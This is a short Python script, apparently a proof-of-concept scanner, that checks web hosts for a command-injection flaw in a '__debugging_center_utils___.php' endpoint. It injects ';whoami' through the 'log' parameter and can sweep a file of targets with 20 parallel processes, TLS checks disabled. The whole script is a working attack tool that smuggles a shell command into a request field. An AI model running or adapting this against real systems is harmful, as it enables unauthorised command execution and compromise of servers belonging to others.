from tabnanny import check

import requests,sys,argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool

def main():
    parser = argparse.ArgumentParser(description='命令执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='输入url')
    parser.add_argument('-f','--file',dest='file',type=str,help='输入文件,批量')
    args = parser.parse_args()
    pool = Pool(20)
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            target = f'http://{args.url}'
            check(target)
    elif args.file:
        f = open(args.file,'r+')
        targets = []
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f'http://{target}'
                targets.append(target)
        pool.map(check,targets)
        pool.close()
def check(target):
    target =f'{target}/__debugging_center_utils___.php?log=;whoami'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
    }
    try:
        response = requests.get(target,headers=headers,verify=False)
        if response.status_code == 200:
            print(f"[*] {target}")
        else:
            print(f"[!] {target}")
    except Exception as e:
        print(f"[error] {target} 超时")
if __name__ == '__main__':
    main()